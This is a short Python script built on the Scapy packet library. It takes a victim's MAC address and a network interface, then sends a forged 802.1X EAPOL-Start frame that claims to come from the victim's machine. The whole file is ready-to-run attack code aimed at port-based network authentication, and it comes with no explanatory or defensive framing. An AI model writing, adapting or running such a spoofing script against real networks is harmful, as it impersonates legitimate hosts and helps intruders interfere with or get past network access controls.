#!/usr/bin/env python

import sys
import argparse
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument("-c", dest="VictimMac", help="Mac address of victim PC", required=True)
parser.add_argument("-i", dest="VictimInt", help="Victim side interface", required=True)
args = parser.parse_args()
clientmac = args.VictimMac
interface = args.VictimInt
payload="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
sendp(Ether(src=clientmac, dst="01:80:c2:00:00:03", type=0x888e)/EAPOL(type=1, len=0)/Padding(load=payload), iface=interface)
